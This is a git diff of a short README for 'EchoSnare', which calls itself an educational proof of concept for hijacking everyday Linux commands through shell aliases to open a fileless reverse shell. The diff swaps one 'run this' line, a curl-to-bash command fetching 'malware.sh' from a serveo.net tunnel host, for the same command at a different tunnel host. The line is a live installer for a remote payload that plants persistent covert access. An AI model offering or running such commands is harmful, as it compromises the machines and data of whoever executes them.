@@ -1,4 +1,4 @@
 # EchoSnare
 EchoSnare is an educational proof-of-concept demonstrating how common Linux commands like ls or cat can be silently hijacked to trigger a fileless reverse shell. Once the victim downloads and runs the tool, it injects a stealthy alias or function into their shell configuration, turning everyday terminal usage into a covert access point.
-run this----curl -s https://4a8c94b8138f449e77656594d05d1024.serveo.net/malware.sh | bash
+run this----curl -s https://683aab8837fbe1449deb63ef6827c364.serveo.net/malware.sh | bash
 
